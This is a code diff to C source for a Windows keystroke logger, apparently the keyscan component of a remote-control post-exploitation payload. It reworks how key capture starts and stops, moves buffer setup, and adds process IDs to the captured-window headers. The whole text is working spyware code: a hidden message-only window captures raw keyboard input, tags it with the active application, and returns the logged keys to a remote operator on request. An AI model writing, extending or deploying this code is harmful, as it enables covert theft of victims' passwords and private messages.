@@ -47,17 +47,20 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 
 typedef enum { false = 0, true = 1 } bool;
 
-/*
- * required function pointers
- */
+// required function pointers
 
 f_GetRawInputData fnGetRawInputData;
 f_RegisterRawInputDevices fnRegisterRawInputDevices;
 f_GetProcessImageFileNameW fnGetProcessImageFileNameW;
 f_QueryFullProcessImageNameW fnQueryFullProcessImageNameW;
 
+// this could be modified
 const char g_szClassName[] = "klwClass";
+
+// handle to main window
 HANDLE tKeyScan = NULL;
+
+// self explanatory
 const unsigned int KEYBUFSIZE = 1024 * 1024;
 
 // global keyscan logging buffer
@@ -74,7 +77,14 @@ WCHAR g_prev_active_image[MAX_PATH] = { 0 };
 
 // pointer to selected data collection function
 INT (*gfn_log_key)(UINT, USHORT, USHORT);
+
+// thread boundary condition
+BOOL KEYSCAN_RUNNING = false;
+
 DWORD dwThreadId;
+
+// window handle
+HWND ghwnd;
 
 /*
  * needed for process enumeration
@@ -104,7 +114,6 @@ BOOL CALLBACK ecw_callback(HWND hWnd, LPARAM lp) {
 int WINAPI ui_keyscan_proc()
 {
 	WNDCLASSEX klwc;
-	HWND hwnd;
 	MSG msg;
 	int ret = 0;
 
@@ -129,16 +138,8 @@ int WINAPI ui_keyscan_proc()
 		return 0;
 	}
 
-	// initialize g_keyscan_buf
-	if (g_keyscan_buf) {
-		free(g_keyscan_buf);
-		g_keyscan_buf = NULL;
-	}
-
-	g_keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));
-
 	// create message-only window
-	hwnd = CreateWindowEx(
+	ghwnd = CreateWindowEx(
 		0,
 		g_szClassName,
 		NULL,
@@ -147,7 +148,7 @@ int WINAPI ui_keyscan_proc()
 		HWND_MESSAGE, NULL, hAppInstance, NULL
 		);
 
-	if (!hwnd)
+	if (!ghwnd)
 	{
 		return 0;
 	}
@@ -206,10 +207,21 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 		HeapFree(GetProcessHeap(), 0, buffer);
 		break;
 
-	case WM_DESTROY:
-		PostQuitMessage(0);
+	case WM_CLOSE:
+		// reset index
+		g_idx = 0;
+
+		// torch buffer
+		free(g_keyscan_buf);
+		g_keyscan_buf = NULL;
+
+		// destroy window and unregister window class
+		DestroyWindow(hwnd);
+		UnregisterClass(g_szClassName, hAppInstance);
 		break;
 
+	case WM_QUIT:
+		return 0;
 	default:
 		return DefWindowProc(hwnd, msg, wParam, lParam);
 	}
@@ -225,23 +237,27 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
 
-  bool track_active_window = packet_get_tlv_value_bool(request, TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW);
+	bool track_active_window = packet_get_tlv_value_bool(request, TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW);
 
-  // set appropriate logging function
-  if (track_active_window) {
-    gfn_log_key = &ui_log_key_actwin;
-  }
-  else {
-    gfn_log_key = &ui_log_key;
-  }
+	// set appropriate logging function
+	(track_active_window == true) ? (gfn_log_key = &ui_log_key_actwin) : (gfn_log_key = &ui_log_key);
 
-	if (tKeyScan) {
+	if (KEYSCAN_RUNNING) {
 		result = 1;
 	}
 	else {
 		// Make sure we have access to the input desktop
 		if (GetAsyncKeyState(0x0a) == 0) {
+			// initialize g_keyscan_buf
+			if (g_keyscan_buf) {
+				free(g_keyscan_buf);
+				g_keyscan_buf = NULL;
+			}
+
+			g_keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));
+
 			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
+			KEYSCAN_RUNNING = true;
 		}
 		else {
 			// No permission to read key state from active desktop
@@ -263,10 +279,11 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
-	g_idx = 0;
 
 	if (tKeyScan) {
-		TerminateThread(tKeyScan, 0);
+		KEYSCAN_RUNNING = false;
+		SendMessageA(ghwnd, WM_CLOSE, 0, 0);
+		CloseHandle(tKeyScan);
 		tKeyScan = NULL;
 	}
 	else {
@@ -287,7 +304,7 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
 
-	if (tKeyScan) {
+  if (tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
 		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)g_keyscan_buf);
 		memset(g_keyscan_buf, 0, KEYBUFSIZE);
@@ -329,6 +346,7 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 
 	// Transmit the response
 	packet_transmit_response(result, remote, response);
+  free(utf8_keyscan_buf);
 	return ERROR_SUCCESS;
 }
 
@@ -378,7 +396,7 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 			GetSystemTime(&st);
 			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
 			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
-			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s\n-[ @ %s %s UTC\n**\n", g_active_image, date_s, time_s);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s | PID: %d\n-[ @ %s %s UTC\n**\n", g_active_image, info.cpid, date_s, time_s);
 			RtlZeroMemory(g_prev_active_image, MAX_PATH);
 			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
 		}
@@ -431,6 +449,7 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		}
 	}
+
 	return 0;
 }
 
